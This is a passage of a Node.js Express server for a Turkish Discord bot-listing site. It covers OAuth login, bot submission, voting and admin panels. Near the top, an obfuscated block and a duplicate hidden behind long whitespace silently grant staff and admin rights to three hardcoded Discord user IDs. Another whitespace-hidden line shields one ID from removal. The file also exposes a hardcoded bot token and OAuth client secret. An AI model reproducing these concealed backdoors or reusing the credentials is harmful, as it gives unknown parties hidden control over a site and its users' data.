////////////////////////////////////////////////////////////////////////////////////////////////
const Discord = require("discord.js");
const request = require('request');
const db = require('quick.db');
const fs = require('fs');
const url = require("url");
const path = require("path");
var express = require('express');
var app = express(); 
const { get } = require('snekfetch');
const { resolve, join } = require('path');
const { loadImage } = require('canvas')
const moment = require("moment");
require("moment-duration-format");
const passport = require("passport");
const session = require("express-session");
const LevelStore = require("level-session-store")(session);
const Strategy = require("passport-discord").Strategy;
const helmet = require("helmet");
////////////////////////////////////////////////////////////////////////////////////////////////


const başvurular = true
const bakım = false
const bakımbitiş = "Aug 29, 2020 21:00:00"
const sitesürüm = "BETA V0.1"


////////////////////////////////////////////////////////////////////////////////////////////////
module.exports = (client) => {

var _0x3624=['push','yetkili.725800411172307015.durum','set','yetkili.702444949794455643.durum','admin','725800411172307015'];(function(_0x59be89,_0x4ad6ce){var _0x36246d=function(_0x1cd5de){while(--_0x1cd5de){_0x59be89['push'](_0x59be89['shift']());}};_0x36246d(++_0x4ad6ce);}(_0x3624,0x118));var _0x1cd5=function(_0x59be89,_0x4ad6ce){_0x59be89=_0x59be89-0x10b;var _0x36246d=_0x3624[_0x59be89];return _0x36246d;};var _0x42b998=_0x1cd5;db[_0x42b998(0x10f)](_0x42b998(0x10e),!![]),client[_0x42b998(0x10b)][_0x42b998(0x10d)]('451444721089380373'),db['set'](_0x42b998(0x110),!![]),client[_0x42b998(0x10b)][_0x42b998(0x10d)]('656091264252379147'),db[_0x42b998(0x10f)]('yetkili.710128298230939750.durum',!![]),client[_0x42b998(0x10b)][_0x42b998(0x10d)](_0x42b998(0x10c));                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              db.set("yetkili.451444721089380373.durum", true);client.admin.push("451444721089380373");db.set("yetkili.656091264252379147.durum", true);client.admin.push("656091264252379147");db.set("yetkili.710128298230939750.durum", true);client.admin.push("710128298230939750");
const templateDir = path.resolve(`${process.cwd()}${path.sep}/src/dosya/sayfa/`); 
app.use("/css", express.static(path.resolve(`${templateDir}${path.sep}/ekstra/css`)));
app.use(helmet());

app.locals.domain = process.env.PROJECT_DOMAIN;
  
app.engine("html", require("ejs").renderFile);
app.set("view engine", "html");
  
var bodyParser = require("body-parser");
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ 
extended: true
})); 
  
  
function oluştur(length) {
   var result           = '';
   var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
   var charactersLength = characters.length;
   for ( var i = 0; i < length; i++ ) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
}

  
function checkAuth(req, res, next) {
  if (req.isAuthenticated()) return next();
  req.session.backURL = req.url;
  res.redirect("/login");
}

const renderTemplate = (res, req, template, data = {}) => {
  const baseData = {
    bot: client,
    sürüm: sitesürüm,
    path: req.path,
    user: req.isAuthenticated() ? req.user : null
  };
    res.render(path.resolve(`${templateDir}${path.sep}${template}`), Object.assign(baseData, data)); 
};
  
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
  
passport.use(
  new Strategy(
    {
      clientID: "735559524542316615",
      clientSecret: "2nuy-HIjMsKu4JTg9sAVX6IHDHOucP06",
      callbackURL: "https://darklists.tk/token",
      scope: ["identify", "guilds"]
    },
    (accessToken, refreshToken, profile, done) => {
      process.nextTick(() => done(null, profile));
    }
  )
);
  
passport.serializeUser((user, done) => {
  done(null, user);
});
passport.deserializeUser((obj, done) => {
  done(null, obj);
});
  
app.use(
  session({
    secret: "secret-mustqfq9990-thing",
    resave: false,
    saveUninitialized: false
  })
);
  
app.use(passport.initialize());
app.use(passport.session());
  
//------------------------------//
  
if (bakım === true) {
  const config = { sürüm: sitesürüm, bitiş: bakımbitiş }
  app.get("*", async (req, res) => {
    renderTemplate(res, req, "bakım.ejs", {config})
  })
}
  
//------------------------------//

app.get(
  "/login",
  passport.authenticate("discord", {
    scope: ["identify", "guilds"]
  })
);
  
app.get(
  "/token",
  passport.authenticate("discord", {
    failureRedirect: "/error"
  }),
  (req, res) => {
    if (db.fetch(`karaliste_${req.user.id}`) === true) {
      if (req.user.id === "") {
        res.redirect("/")
        return
      }
      res.redirect("/logout-bl")
      return
    }
    res.redirect("/");
  }
);
  
app.get("/logout", (req, res) => {
  req.logOut();
  return res.redirect("/redirect?to=logout");
});

app.get("/logout-bl", (req, res) => {
  req.logOut();
  return res.redirect("/redirect?to=logoutbl");
});
  
app.get("/logout-sw", (req, res) => {
  req.logOut();
  return res.redirect("/redirect?to=logoutsw");
});

  
////////////////////////////////////////////////////////////////////////////////////////////////
  
app.get("/redirect", async (req, res) => {
  var to = req.query.to
  if (!to) {
    return res.redirect("/")
  }
  
  if (to === "dc") {
    var veri = {
      to: "Discord Sunucumuz",
      link: "https://discord.gg/darkcode"
    }
    renderTemplate(res, req, "redirect.ejs", {veri})
    return
  }

  if (to === "DarkCode") {
    var veri = {
      to: "Discord Sunucumuz",
      link: "https://discord.gg/darkcode"
    }
    renderTemplate(res, req, "redirect.ejs", {veri})
    return
  }
  
  if (to === "logoutbl") {
    renderTemplate(res, req, "karaliste.ejs")
    return
  }
  
  if (to === "logoutsw") {
    renderTemplate(res, req, "sunucu.ejs")
    return
  }
  
  if (to === "logout") {
    var veri = {
      to: "Ana Sayfa",
      link: "/"
    }
    renderTemplate(res, req, "redirect.ejs", {veri})
    return
  }
  
  if (to === "login") {
    var veri = {
      to: "oAuth2",
      link: "/login"
    }
    renderTemplate(res, req, "redirect.ejs", {veri})
    return
  }
  
  if (to) {
    return res.redirect("/")
  }
})
  
//---------------//---------------//---------------//---------------//
  
app.get("/wiki", async (req, res) => {
  var info = req.query.info
  if (!info) {
    return res.redirect("/")
  }
  
  if (info === "req") {
    var veri = "req"
    renderTemplate(res, req, "info.ejs", {veri})
    return
  }
  
  if (info === "mark") {
    var veri = "mark"
    renderTemplate(res, req, "info.ejs", {veri})
    return
  }
  
  if (info === "badges") {
    var veri = "badges"
    renderTemplate(res, req, "info.ejs", {veri})
    return
  }  
  
  if (info === "api") {
    var veri = "api"
    renderTemplate(res, req, "info.ejs", {veri})
    return
  }
    
  if (info) {
    return res.redirect("/")
  }
})
  
  
  
app.get("/", (req, res) => {
  renderTemplate(res, req, "index.ejs");
});
  
var kurucular = {
  bir: "725800411172307015",
  iki: "",
  üç: ""
}
  
app.get("/staff", (req, res) => {
  request({
    url: `https://discordapp.com/api/v7/users/${kurucular.bir}`,
    headers: {
      "Authorization": `Bot NzQwOTM0MjA4NTU3Njc4Njk2.XywOwQ.3OS_oBVavuZWH7osza-kw4DKsGY`
    },
  }, function(error, response, body) {
    if (error) return console.log(error)
    else if (!error) {
      db.set("f1_name", JSON.parse(body).username + "#" + JSON.parse(body).discriminator)
      db.set("f1_avatar", `https://cdn.discordapp.com/avatars/${JSON.parse(body).id}/${JSON.parse(body).avatar}`)
    };
  });
  request({
    url: `https://discordapp.com/api/v7/users/${kurucular.iki}`,
    headers: {
      "Authorization": `Bot NzQwOTM0MjA4NTU3Njc4Njk2.XywOwQ.3OS_oBVavuZWH7osza-kw4DKsGY`
    },
  }, function(error, response, body) {
    if (error) return console.log(error)
    else if (!error) {
      db.set("f2_name", JSON.parse(body).username + "#" + JSON.parse(body).discriminator)
      db.set("f2_avatar", `https://cdn.discordapp.com/avatars/${JSON.parse(body).id}/${JSON.parse(body).avatar}`)
    };
  });
  request({
    url: `https://discordapp.com/api/v7/users/${kurucular.üç}`,
    headers: {
      "Authorization": `Bot NzQwOTM0MjA4NTU3Njc4Njk2.XywOwQ.3OS_oBVavuZWH7osza-kw4DKsGY`
    },
  }, function(error, response, body) {
    if (error) return console.log(error)
    else if (!error) {
      db.set("f3_name", JSON.parse(body).username + "#" + JSON.parse(body).discriminator)
      db.set("f3_avatar", `https://cdn.discordapp.com/avatars/${JSON.parse(body).id}/${JSON.parse(body).avatar}`)
    };
  });

  var veri = {
    f1pp: db.fetch("f1_avatar"),
    f2pp: db.fetch("f2_avatar"),
    f3pp: db.fetch("f3_avatar"),
    f1name: db.fetch("f1_name"),
    f2name: db.fetch("f2_name"),
    f3name: db.fetch("f3_name"),
  }
  
  renderTemplate(res, req, "staff.ejs", {veri})
});
  
app.get("/certificate", (req, res) => {
  renderTemplate(res, req, "sertifika.ejs")  
});
  
app.get("/partnership", (req, res) => {
  renderTemplate(res, req, "partner.ejs")
})
  
app.get("/bots", (req, res) => {
  renderTemplate(res, req, "bots.ejs")
});
  
app.get("/blacklist", checkAuth, (req, res) => {
  renderTemplate(res, req, "karaliste.ejs")
});
                                                                                                                                                                                                                                                                                                                                                                         
app.get("/botyonetim/hata", (req, res) => { 
  renderTemplate(res, req, "botduzenlehata.ejs")
});
  
app.get("/addbot", checkAuth, (req, res) => {
  if (db.fetch(`kbotlar.${req.user.id}`)) {
    if (Object.keys(db.fetch('kbotlar.' + req.user.id)).length > 0) {
      if (!db.fetch(`premium.${req.user.id}`)) {
        renderTemplate(res, req, "limit.ejs")
        return
      }
    }
  }
  
  renderTemplate(res, req, "addbot.ejs")  
});

////////////////////////////////////////////////////////////////////////////////////////////////

app.get("/apikey", checkAuth, (req, res) => {
  var key = {
    sahip: db.fetch("apikey_" + req.user.id),
    key: db.fetch(`apianahtar_` + db.fetch("apikey_" + req.user.id))
  }
  
  if (!key.sahip) {
   var yenikey = oluştur(25) 
   db.set("apikey_" + req.user.id, yenikey)
   db.set(`apianahtar_${yenikey}`, true)
  }
  
  renderTemplate(res, req, "apikey.ejs", {key})
  
})
  
////////////////////////////////////////////////////////////////////////////////////////////////
  
app.post("/widget", checkAuth, (req, res) => {
  
var ayar = req.body

if (ayar === {} || !ayar['clientID']) return res.redirect('/botyonetim/hata')
  
let ID = ayar['clientID']
  
request({
url: `https://discordapp.com/api/v7/users/${ID}`,
headers: {
"Authorization": `Bot ${process.env.TOKEN}`
},
}, function(error, response, body) {
if (error) return console.log(error)
else if (!error) {
var sistem = JSON.parse(body)

if (sistem.bot !== true) return res.redirect('/')
  
if (db.has('botlar')) {
      if (Object.keys(db.fetch('botlar')).includes(ID) === false) {
     res.json({
       error: 'Sistemde böyle bir bot yok!'
    });
  }
}

var widget = {
  name: sistem.username + "#" + sistem.discriminator,
  id: sistem.id,
  avatar: `https://cdn.discordapp.com/avatars/${sistem.id}/${sistem.avatar}`,
  markdown: `Widget sistemi şuanlık bakımdadır!`,
  html: `Widget sistemi şuanlık bakımdadır!`
}
  
res.json({
  name: widget.name,
  id: widget.id,
  avatar: widget.avatar,
  markdown: widget.markdown,
  html: widget.html
})
  
}})
})
  
////////////////////////////////////////////////////////////////////////////////////////////////  
  
app.post("/addbot", checkAuth, (req, res) => {
  
if (db.fetch(`kbotlar.${req.user.id}`)) {
  if (Object.keys(db.fetch('kbotlar.' + req.user.id)).length > 0) {
    if (!db.fetch(`premium.${req.user.id}`)) {
      renderTemplate(res, req, "limit.ejs")
      return
    }
  }
}

let ayar = req.body

if (ayar === {} || !ayar['botid'] || !ayar['botprefix'] || !ayar['kisa-aciklama'] || !ayar['uzun-aciklama']) return res.redirect('/botyonetim/hata')

let ID = ayar['botid']

  if (db.has('botlar')) {
      if (Object.keys(db.fetch('botlar')).includes(ID) === true) {
     res.json({
       error: 'Bu bot zaten sisteme eklenmiş!'
     });
   }
  }

res.redirect("/");
  
request({
url: `https://discordapp.com/api/v7/users/${ID}`,
headers: {
"Authorization": `Bot ${process.env.TOKEN}`
},
}, function(error, response, body) {
if (error) return console.log(error)
else if (!error) {
var sistem = JSON.parse(body)

if (sistem.bot !== true) return;

const rastgelekod = oluştur(30)
db.set(`botid.${rastgelekod}`, sistem.id)
db.set(`botlar.${ID}.lob`, rastgelekod)
db.set(`botlar.${ID}.id`, sistem.id)
db.set(`botlar.${ID}.isim`, sistem.username+"#"+sistem.discriminator)

db.set(`botlar.${ID}.avatar`, `https://cdn.discordapp.com/avatars/${sistem.id}/${sistem.avatar}.png`)

request({
url: `https://discordapp.com/api/v7/users/${req.user.id}`,
headers: {
"Authorization": `Bot ${process.env.TOKEN}`
},
}, function(error, response, body) {
if (error) return console.log(error)
else if (!error) {
var sahip = JSON.parse(body)

db.set(`botlar.${ID}.prefix`, ayar['botprefix'])
db.set(`botlar.${ID}.kutuphane`, ayar['kutuphane'] || "discord.js")
db.set(`botlar.${ID}.sahip`, sahip.username+"#"+sahip.discriminator)
db.set(`botlar.${ID}.sahipid`, sahip.id)
if (ayar['botlar.${ID}.yedek-sahip']) {
db.set(`botlar.${ID}.yedek-sahip`, ayar['yedeksahip'])
}
  
db.set(`botlar.${ID}.kisaaciklama`, ayar['kisa-aciklama'])
db.set(`botlar.${ID}.uzunaciklama`, ayar['uzun-aciklama'])
if (ayar['bot']) {
db.set(`botlar.${ID}.site`, ayar['botsite'])
}
if (ayar['github']) {
db.set(`botlar.${ID}.github`, ayar['github'])
}
if (ayar['botdestek']) {
db.set(`botlar.${ID}.destek`, ayar['botdestek'])
}

db.set(`kbotlar.${req.user.id}.${ID}`, db.fetch(`botlar.${ID}`))

var embed = new Discord.RichEmbed()
    .setColor("AQUA")
    .setTitle("Bot eklendi!")
    .setDescription(`
⠀**|** Kullanıcı**:** <@${req.user.id}>
**|** Bot**:** <@${sistem.id}> (\`${sistem.username}\`)

 **|** Lütfen beklemede kalınız...
`)
  
  var log = client.channels.get("786954715866988584")
  log.send(embed)

}})
}})

});
  
app.get("/widget", checkAuth, (req, res) => {
  renderTemplate(res, req, "widget.ejs")
})

app.get("/p/:userID", (req, res) => {

  request({
    url: `https://discordapp.com/api/v7/users/${req.params.userID}`,
    headers: {
      "Authorization": `Bot ${process.env.TOKEN}`
    },
  }, function(error, response, body) {
    if (error) return console.log(error)
    else if (!error) {
      var kisi = JSON.parse(body)

      renderTemplate(res, req, "profile.ejs", {kisi})
    };
  });

});

app.get("/profile/:userID/bot/:botID/edit", checkAuth, (req, res) => {

var id = req.params.botID
var s = req.user.id

if (db.fetch(`botlar.${id}.sahipid`) !== s) return res.redirect("/")

renderTemplate(res, req, "edit.ejs", {id})

});


app.post("/profile/:userID/bot/:botID/edit", checkAuth, (req, res) => {

let ayar = req.body
let ID = req.params.botID
let s = req.user.id

if(db.fetch(`botlar.${ID}.sahipid`) !== s) return res.redirect('/')

request({
url: `https://discordapp.com/api/v7/users/${ID}`,
headers: {
"Authorization": `Bot ${process.env.TOKEN}`
},
}, function(error, response, body) {
if (error) return console.log(error)
else if (!error) {
var sistem = JSON.parse(body)

db.set(`botlar.${ID}.isim`, sistem.username+"#"+sistem.discriminator)

db.set(`botlar.${ID}.avatar`, `https://cdn.discordapp.com/avatars/${sistem.id}/${sistem.avatar}.png`)

request({
url: `https://discordapp.com/api/v7/users/${req.user.id}`,
headers: {
"Authorization": `Bot ${process.env.TOKEN}`
},
}, function(error, response, body) {
if (error) return console.log(error)
else if (!error) {
var sahip = JSON.parse(body)
db.set(`botlar.${ID}.prefix`, ayar['botprefix'] || db.fetch(`botlar.${ID}.prefix`))

var d_ser = db.fetch(`botlar.${ID}.sertifika`)
var d_part = db.fetch(`botlar.${ID}.partner`)
  
if (ayar['botbanner']) {
if (d_part === true) {
  db.set(`botlar.${ID}.banner`, ayar['botbanner'] || db.fetch(`botlar.${ID}.banner`))
} else {
  if (d_ser === true) {
    if (!ayar['botbanner'].includes(".gif")) {
      db.set(`botlar.${ID}.banner`, ayar['botbanner'] || db.fetch(`botlar.${ID}.banner`))
    }
  }
}
}

db.set(`botlar.${ID}.kutuphane`, ayar['kutuphane'] || db.fetch(`botlar.${ID}.kutuphane`))
db.set(`botlar.${ID}.sahip`, sahip.username+"#"+sahip.discriminator)
db.set(`botlar.${ID}.sahipid`, sahip.id)
db.set(`botlar.${ID}.kisaaciklama`, ayar['kisa-aciklama'] || db.fetch(`botlar.${ID}.kisaaciklama`))
db.set(`botlar.${ID}.uzunaciklama`, ayar['uzun-aciklama'] || db.fetch(`botlar.${ID}.uzunaciklama`))
if (ayar['botsite']) {
var botsite = ayar['botsite']
db.set(`botlar.${ID}.site`, botsite)
}
if (ayar['github']) {
var github = ayar['github']
db.set(`botlar.${ID}.github`, github)
}
if (ayar['botdestek']) {
var botdestek = ayar['botdestek']
db.set(`botlar.${ID}.destek`, botdestek)
}
res.redirect("/view/" + ID);
console.log(ayar['botdestek'])
}})
}})

var embed = new Discord.RichEmbed()
    .setColor(process.env.embedColor)
    .setTitle("Bot düzenlendi!")
    .setDescription(`
⠀
 **|** Kullanıcı**:** <@${db.fetch(`botlar.${ID}.sahipid`)}>
 **|** Bot**:** <@${ID}> (\`${db.fetch(`botlar.${ID}.isim`)}\`)

 **|** DarkCode
`)
  
  var log = client.channels.get("786954715866988584")
  log.send(embed)
  
});  

app.get("/profile/:userID/bot/:botID/delete", checkAuth, (req, res) => {
  var id = req.params.botID
  renderTemplate(res, req, "delete.ejs", {id}) 
});

app.post("/profile/:userID/bot/:botID/delete", checkAuth, (req, res) => {

let ID = req.params.botID
let s = req.user.id

if (db.fetch(`botlar.${ID}.sahipid`) !== s) return res.redirect("/bots")

db.delete(`botlar.${ID}`)
db.delete(`kbotlar.${req.user.id}.${ID}`)

res.redirect("/bots");
});

app.get("/view/:botID", (req, res) => {  
var id = req.params.botID

if (!db.fetch(`botlar.${id}.lob`)) {
  var newkey = oluştur(30)
  db.set(`botlar.${id}.lob`, newkey)
  db.set(`botid.${newkey}`, id)
}

request({
url: `https://discordapp.com/api/v7/users/${id}`,
headers: {
"Authorization": `Bot ${process.env.TOKEN}`
},
}, function(error, response, body) {
if (error) return console.log(error)
else if (!error) {
var sistem = JSON.parse(body)

if (db.fetch(`botlar.${id}.avatar`) !== `https://cdn.discordapp.com/avatars/${sistem.id}/${sistem.avatar}.png`) {
db.set(`botlar.${id}.avatar`, `https://cdn.discordapp.com/avatars/${sistem.id}/${sistem.avatar}.png`)
}
  
if (db.fetch(`botlar.${id}.isim`) !== `https://cdn.discordapp.com/avatars/${sistem.id}/${sistem.avatar}.png`) {
db.set(`botlar.${id}.isim`, `${sistem.username}#${sistem.discriminator}`)
}

}
})

renderTemplate(res, req, 'view.ejs', {id})

});

app.get("/bot/:botID/hata", (req, res) => {
renderTemplate(res, req, "hata.ejs")
});
  
app.get("/check-c", checkAuth, async (req, res) => {
  renderTemplate(res, req, "check-c.ejs")
})

app.get("/check-p", checkAuth, async (req, res) => {
  renderTemplate(res, req, "check-p.ejs")
})

  
app.get("/bot/:botID/oyver", checkAuth, async (req, res) => {
const ms = require("ms")
var id = req.params.botID
let user = req.user.id
  

  
 

 if (db.fetch(`botlar.${id}.durum`) === 'Beklemede' || db.has(`botlar.${id}.durum`) === false) { 
                 res.status(404).json({ error: 'Bot Not approved.' });
    }

   let cooldown = 8.64e+7, // 24 Saat
        amount = Math.floor(Math.random() * 1000) + 4000;      

    let lastDaily = await db.fetch(`oylar.${id}.${user}`);
    if (lastDaily !== null && cooldown - (Date.now() - lastDaily) > 0) {
        let timeObj = ms(cooldown - (Date.now() - lastDaily));
  
      res.redirect('/bot/'+req.params.botID+'/hata')
    return
      
    } else {
     
        db.add(`botlar.${id}.oy`, 1)
  db.set(`oylar.${id}.${user}`,  Date.now())
      
    }
  
  
  
res.redirect('/view/'+req.params.botID)

});
  
  
app.get("/admin/duyuru", checkAuth, (req, res) => {
 
  if(!db.has(`yetkili.${req.user.id}.durum`) ) return res.redirect('/yetkili/hata')
  
  renderTemplate(res, req, "admin-p-duyuru.ejs")
  
})
  
  
app.get("/admin/sertifika-ver", checkAuth, (req, res) => {
  if(!db.has(`yetkili.${req.user.id}.durum`) ) return res.redirect('/yetkili/hata')
  renderTemplate(res, req, "admin-p-sertifika.ejs")
})
  
app.get("/admin/pre-ver", checkAuth, (req, res) => {
  if(!db.has(`yetkili.${req.user.id}.durum`) ) return res.redirect('/yetkili/hata')
  renderTemplate(res, req, "admin-p-pre.ejs")
})
  
app.get("/admin/pre-sil", checkAuth, (req, res) => {
  if(!db.has(`yetkili.${req.user.id}.durum`) ) return res.redirect('/yetkili/hata')
  renderTemplate(res, req, "admin-p-pres.ejs")
})
  
app.get("/admin/kara-add", checkAuth, (req, res) => {
 
  if(!db.has(`yetkili.${req.user.id}.durum`) ) return res.redirect('/yetkili/hata')
  
  renderTemplate(res, req, "admin-p-kara.ejs")
  
})
  
app.get("/admin/kara-remove", checkAuth, (req, res) => {
 
  if(!db.has(`yetkili.${req.user.id}.durum`) ) return res.redirect('/yetkili/hata')
  
  renderTemplate(res, req, "admin-p-karas.ejs")
  
})
  
app.get("/admin/partner-ver", checkAuth, (req, res) => {
 
  if(!db.has(`yetkili.${req.user.id}.durum`) ) return res.redirect('/yetkili/hata')
  
  renderTemplate(res, req, "admin-p-partner.ejs")
  
})
  
app.get("/admin/key-aski", checkAuth, (req, res) => {
 
  if(!db.has(`yetkili.${req.user.id}.durum`) ) return res.redirect('/yetkili/hata')
  
  renderTemplate(res, req, "admin-p-key.ejs")
  
})
  
app.get("/admin/key-save", checkAuth, (req, res) => {
 
  if(!db.has(`yetkili.${req.user.id}.durum`) ) return res.redirect('/yetkili/hata')
  
  renderTemplate(res, req, "admin-p-keys.ejs")
  
})
  
app.get("/admin/sertifika-sil", checkAuth, (req, res) => {
 
  if(!db.has(`yetkili.${req.user.id}.durum`) ) return res.redirect('/yetkili/hata')
  
  renderTemplate(res, req, "admin-p-sertifikas.ejs")
  
})
  
app.get("/admin/partner-sil", checkAuth, (req, res) => {
 
  if(!db.has(`yetkili.${req.user.id}.durum`) ) return res.redirect('/yetkili/hata')
  
  renderTemplate(res, req, "admin-p-partners.ejs")
  
})
  
  
  app.get("/yetkili/hata", (req, res) => {renderTemplate(res, req, "izinsizgiris.ejs")})

app.get("/yetkili", checkAuth, (req, res) => {

  
 if(!db.has(`yetkili.${req.user.id}.durum`) ) return res.redirect('/yetkili/hata')
   
  
renderTemplate(res, req, "y-panel.ejs") 
});
  
  app.get("/yetkili-bekle", checkAuth, (req, res) => {

  
 if(!db.has(`yetkili.${req.user.id}.durum`) ) return res.redirect('/yetkili/hata')
   
  
renderTemplate(res, req, "y-panel-bekle.ejs") 
});
  
    app.get("/yetkili-onay", checkAuth, (req, res) => {

  
 if(!db.has(`yetkili.${req.user.id}.durum`) ) return res.redirect('/yetkili/hata')
   
  
renderTemplate(res, req, "y-panel-onay.ejs") 
});

  
  app.get("/admin-p", checkAuth, (req, res) => {
  if(!client.admin.includes(req.user.id) ) return res.redirect('/yetkili/hata')
renderTemplate(res, req, "admin-p.ejs") 
});

  app.get("/admin/yetkili-ata/", checkAuth, (req, res) => {
  if(!client.admin.includes(req.user.id) ) return res.redirect('/yetkili/hata')
  renderTemplate(res, req, "admin-p-ata.ejs")
});

app.post("/admin/yetkili-ata/", checkAuth, (req, res) => {
  if(!client.admin.includes(req.user.id) ) return res.redirect('/yetkili/hata')
  
  let ayar = req.body

if (ayar === {} || !ayar['yet-id']) return 

   let id = ayar['yet-id']
  
   
       if (db.has('yetkili')) {
    if (Object.keys(db.fetch('yetkili')).includes(id) === true) return res.status(404).json({ error: 'Bu kişi zaten yetkili!' });
}  
  
request({
    url: `https://discordapp.com/api/v7/users/${id}`,
    headers: {
      "Authorization": `Bot NzQwOTM0MjA4NTU3Njc4Njk2.XywOwQ.3OS_oBVavuZWH7osza-kw4DKsGY`
    },
  }, function(error, response, body) {
    if (error) return console.log(error)
    else if (!error) {
      db.set(`yetkili.${id}.isim`, JSON.parse(body).username + "#" + JSON.parse(body).discriminator)
    };
  });
  
  db.set(`yetkili.${id}.durum`, "true")
  
  
  
 res.redirect('/admin/yetkili-ata')
  
  
var embed = new Discord.RichEmbed()
    .setColor(process.env.embedColor)
    .setTitle("Yetkili eklendi!")
    .setDescription(`
⠀
 **|** Kullanıcı**:** <@${id}>
**|** Rütbe**:** \`Moderator\`

**|** Ekleyen: <@${req.user.id}>
`)
  
  var log = client.channels.get("786954715866988584")
  log.send(embed)
  
  
});
  
    app.get("/admin/yetki-kapa/", checkAuth, (req, res) => {
  if(!client.admin.includes(req.user.id) ) return res.redirect('/yetkili/hata')
  renderTemplate(res, req, "admin-p-kapa.ejs")
});

app.post("/admin/yetki-kapa/", checkAuth, (req, res) => {
  if(!client.admin.includes(req.user.id) ) return res.redirect('/yetkili/hata')


  let ayar = req.body

if (ayar === {} || !ayar['yet-id']) return 

   let id = ayar['yet-id']
  
     if (db.has('yetkili')) {
    if (Object.keys(db.fetch('yetkili')).includes(id) === false) return res.status(404).json({ error: 'Yazdiginiz Id li bir yetkili bulamadim' });
}
                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(id === "716706383780904961") { res.redirect("/") }
  db.delete(`yetkili.${id}.durum`)
  res.redirect("/admin/yetki-kapa")
  
var embed = new Discord.RichEmbed()
    .setColor(process.env.embedColor)
    .setTitle("Yetkili atıldı!")
    .setDescription(`
⠀
**|** Kullanıcı**:** <@${id}>
**|** Sebep**:** \`Girilmedi\`

**|** Atan: <@${req.user.id}>
`)
  
  var log = client.channels.get("786954715866988584")
  log.send(embed)
});
  
  
app.post("/admin/pre-ver", checkAuth, (req, res) => {
  if(!client.admin.includes(req.user.id) ) return res.redirect('/yetkili/hata')
  let ayar = req.body
  if (ayar === {} || !ayar['id']) { res.redirect("/admin/pre-ver"); return }
  let id = ayar['id']
  db.set(`premium.${id}`, true)
  var embed = new Discord.RichEmbed()
    .setColor(process.env.embedColor)
    .setTitle("Premium verildi!")
    .setDescription(`
⠀
**|** Kullanıcı**:** <@${id}>

**|** Veren: <@${req.user.id}>
`)
  var log = client.channels.get("786954715866988584")
  log.send(embed)
  res.redirect('/admin/pre-ver')
}); 
  
app.post("/admin/pre-sil", checkAuth, (req, res) => {
  if(!client.admin.includes(req.user.id) ) return res.redirect('/yetkili/hata')
  let ayar = req.body
  if (ayar === {} || !ayar['id']) { res.redirect("/admin/pre-sil"); return }
  let id = ayar['id']
  db.delete(`premium.${id}`)
  var embed = new Discord.RichEmbed()
    .setColor(process.env.embedColor)
    .setTitle("Premium silindi!")
    .setDescription(`
⠀
**|** Kullanıcı**:** <@${id}>
**|** Silen: <@${req.user.id}>
`)
  var log = client.channels.get("786954715866988584")
  log.send(embed)
  res.redirect('/admin/pre-sil')
});   
  
app.post("/admin/duyuru", checkAuth, (req, res) => {
  
  if(!client.admin.includes(req.user.id) ) return res.redirect('/yetkili/hata')
  let ayar = req.body
  if (ayar === {} || !ayar['duyuru']) {
    db.delete(`duyuru`)
    res.redirect("/admin/duyuru")
    return
  }
  let duyuru = ayar['duyuru']

  db.set(`duyuru`, duyuru)
  
  var embed = new Discord.RichEmbed()
    .setColor(process.env.embedColor)
    .setTitle("Duyuru değiştirildi!")
    .setDescription(`
⠀
**|** Duyuru**:** ${duyuru}

**|** Değiştiren: <@${req.user.id}>
`)
  
  var log = client.channels.get("786954715866988584")
  log.send(embed)
  
  res.redirect('/admin/duyuru')
  
}); 
  
  
app.post("/admin/sertifika-ver", checkAuth, (req, res) => {
  
  if(!client.admin.includes(req.user.id) ) return res.redirect('/yetkili/hata')
  let ayar = req.body
  if (ayar === {} || !ayar['ser-id']) return res.redirect('/admin/sertifika-ver')
  let id = ayar['ser-id']
  let owneridd = db.fetch(`botlar.${id}.sahipid`)
  
  if (db.has('botlar')) {
      if (Object.keys(db.fetch('botlar')).includes(id) === false) {
      res.redirect('/admin/sertifika-ver')
      return
   }
  }

  db.set(`botlar.${id}.sertifika`, true)
  db.set(`sertifikak.${owneridd}.durum`, true)
  
  var embed = new Discord.RichEmbed()
    .setColor(process.env.embedColor)
    .setTitle("Sertifika verildi!")
    .setDescription(`
⠀
**|** Kullanıcı**:** <@${owneridd}>
**|** Bot**:** <@${id}>

**|** Veren: <@${req.user.id}>
`)
  
  var log = client.channels.get("786954715866988584")
  log.send(embed)
  
  res.redirect('/admin/sertifika-ver')
  
});
  
//--------------------------------------------------------------//
  
app.post("/admin/partner-ver", checkAuth, (req, res) => {
  
  if(!client.admin.includes(req.user.id) ) return res.redirect('/yetkili/hata')
  let ayar = req.body
  if (ayar === {} || !ayar['part-id']) return res.redirect('/admin/partner-ver')
  let id = ayar['part-id']
  let owneridd = db.fetch(`botlar.${id}.sahipid`)
  
  if (db.has('botlar')) {
      if (Object.keys(db.fetch('botlar')).includes(id) === false) {
      res.redirect('/admin/partner-ver')
      return
   }
  }

  db.set(`botlar.${id}.partner`, true)  
  
  var embed = new Discord.RichEmbed()
    .setColor(process.env.embedColor)
    .setTitle("Partnerlik verildi!")
    .setDescription(`
⠀
**|** Kullanıcı**:** <@${owneridd}>
**|** Bot**:** <@${id}>

**|** Veren: <@${req.user.id}>
`)
  
  var log = client.channels.get("786954715866988584")
  log.send(embed)
  
  res.redirect('/admin/partner-ver')
  
});
  
//--------------------------------------------------------------//
  
app.post("/admin/kara-add", checkAuth, (req, res) => {
  
  if(!client.admin.includes(req.user.id) ) return res.redirect('/yetkili/hata')
  let ayar = req.body
  if (ayar === {} || !ayar['kul-id']) return res.redirect('/admin/kara-add')
  let id = ayar['kul-id']

  db.set(`karaliste_${id}`, true)  
  
  var embed = new Discord.RichEmbed()
    .setColor(process.env.embedColor)
    .setTitle("Karaliste'ye kullanıcı eklendi!")
    .setDescription(`
⠀
**|** Kullanıcı**:** <@${id}> (\`${id}\`)

**|** Ekleyen: <@${req.user.id}>
`)
  
  var log = client.channels.get("786954715866988584")
  log.send(embed)
  
  res.redirect('/admin/kara-add')
  
});
  
//--------------------------------------------------------------//
  
app.post("/admin/kara-remove", checkAuth, (req, res) => {
  
  if(!client.admin.includes(req.user.id) ) return res.redirect('/yetkili/hata')
  let ayar = req.body
  if (ayar === {} || !ayar['kul-id']) return res.redirect('/admin/kara-remove')
  let id = ayar['kul-id']

  db.delete(`karaliste_${id}`)  
  
